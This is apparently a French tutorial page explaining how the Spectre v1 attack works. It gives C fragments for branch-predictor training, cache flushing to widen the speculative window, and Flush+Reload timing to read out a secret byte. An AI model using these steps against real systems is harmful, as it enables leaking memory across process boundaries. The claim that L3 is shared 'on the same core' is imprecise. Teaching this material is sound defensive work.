Exécution spéculative — le mécanisme clé

Le processeur n'attend pas. Il prédit, exécute en avance, et annule si nécessaire. Mais le cache, lui, garde les traces.

👁

Observable

N'importe quel processus peut mesurer ses propres temps d'accès via __rdtscp(). Aucun privilège requis.

🔗

Partagé

Le cache L3 est partagé entre processus sur le même cœur. Ce qu'un processus met en cache est visible par un autre.

⚡

Persistant

L'annulation d'une exécution spéculative efface les registres — mais pas le cache. La trace reste.

Mécanisme d'attaque

Les trois phases de Spectre

Phase d'entraînement du prédicteur

L'attaquant appelle la fonction vulnérable plusieurs fois avec des valeurs valides (x < array1_size). Le Branch Predictor Unit (BPU) apprend que cette condition est toujours vraie et commence à prédire "branche prise" systématiquement.

// Entraîner le prédicteur avec des valeurs légitimes for (int i = 0; i < 200; i++) victim_function(i % array1_size); // toujours valide // BPU : "cette branche est TOUJOURS prise" ✓

Phase d'exploitation spéculative

L'attaquant appelle avec x hors-limites (pointant vers le secret). Il vide aussi array1_size du cache pour ralentir la vérification. Le BPU prédit encore "pris" → spéculation → accès hors-limites → secret chargé en cache.

_mm_clflush(&array1_size); // rendre la garde lente (~200 cycles) x = (secret_addr - array1_addr); // pointer vers le secret victim_function(x); // BPU prédit "pris" → spéculation // pendant les ~200 cycles d'attente de array1_size : // array2[secret_value * 512] chargé en cache !

Phase d'extraction par Flush+Reload

L'attaquant mesure le temps d'accès à chaque array2[i * 512]. L'index avec une latence < threshold est en cache. C'est la valeur du secret.

for (int i = 0; i < 256; i++) { t = rdtscp_latency(&array2[i * 512]); if (t < THRESHOLD) { printf("Secret = %d\n", i); // CACHE HIT → secret trouvé } }
